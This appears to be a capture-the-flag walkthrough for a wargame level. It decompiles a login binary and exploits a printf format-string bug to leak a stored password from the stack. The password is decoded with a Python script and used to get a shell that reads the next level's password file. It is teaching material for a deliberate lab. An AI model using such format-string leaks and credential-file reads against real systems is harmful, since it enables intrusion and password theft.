# Solution

Here is the decompile C code from the binary:

```c
int main(void)
{
    char    s2[96];
    char    ptr[48];
    char    s1[96];
    int     result;
    FILE    *stream;
    
    memset(s1, 0, sizeof(s1));
    memset(ptr, 0, 41);
    memset(s2, 0, sizeof(s2));
    stream = NULL;
    stream = fopen("/home/users/level03/.pass", "r");
    if (!stream)
    {
        fwrite("ERROR: failed to open password file\n", 1, 0x24, stderr);
        exit(1);
    }
    result = fread(ptr, 1, 0x29, stream);
    if (result != 41)
    {
        fwrite("ERROR: failed to read password file\n", 1, 0x24, stderr);
        exit(1);
    }
    fclose(stream);
    puts("===== [ Secure Access System v1.0 ] =====");
    puts("/***************************************\\");
    puts("| You must login to access this system. |");
    puts("\\**************************************/");
    printf("--[ Username: ");
    fgets(s1, 100, stdin);
    s1[strcspn(s1, "\n")] = 0;
    printf("--[ Password: ");
    fgets(s2, 100, stdin);
    s2[strcspn(s2, "\n")] = 0;
    puts("*****************************************");
    if ( strncmp(ptr, s2, 0x29uLL) )
    {
        printf(s1);
        puts(" does not have access!");
        exit(1);
    }
    printf("Greetings, %s!\n", s1);
    system("/bin/sh");
    return 0;
}
```

Here the exploit is a printf leak from the stack.

Basically if the strcmp of `s2` and `ptr` which store the current password failed this will allow us to use the `printf` call,
with only s1 as args which allow us to leverage a `printf format attack`.

This is pretty simple to exploit here since ptr have already the stored password we need to leak the stack and from that we will get the password.

Im just showing the end result but you will have to input as username %x until you find data that could look like password.

```sh
level02@OverRide:~$ ./level02 
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: %22$p %23$p %24$p %25$p %26$p
--[ Password: 
*****************************************
0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d does not have access!
```

here we use `%22$p` to avoid having to much information printed, we use `p` and not `x` because `p` will show us the full content, 
while `x` will show only the 4 byte of content.

From that we will gather all the data and put the data inside a python script that will give use the proper formatted password.
(because the output that you see above is the little endian result).

Here is the python script:

```python
#!/usr/bin/env python

first_chunck = [0x75, 0x6e, 0x50, 0x52, 0x34, 0x37, 0x68, 0x48]
second_chunck = [0x45, 0x41, 0x4a, 0x35, 0x61, 0x73, 0x39, 0x51]
third_chunck = [0x37, 0x7a, 0x71, 0x43, 0x57, 0x4e, 0x67, 0x58]
fourth_chunck = [0x35, 0x4a, 0x35, 0x68, 0x6e, 0x47, 0x58, 0x73]
fifth_chunck = [0x48, 0x33, 0x67, 0x50, 0x66, 0x4b, 0x39, 0x4d]

result = bytearray(first_chunck[::-1])
result += bytearray(second_chunck[::-1])
result += bytearray(third_chunck[::-1])
result += bytearray(fourth_chunck[::-1])
result += bytearray(fifth_chunck[::-1])
print(result.decode())
# Output: "Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H"
```

Now let's try to input the password we should get a shell if the password is correct.

```sh
level02@OverRide:~$ ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: toto
--[ Password: Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
*****************************************
Greetings, toto!
$ whoami
level03
$ cat /home/users/level03/.pass
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```
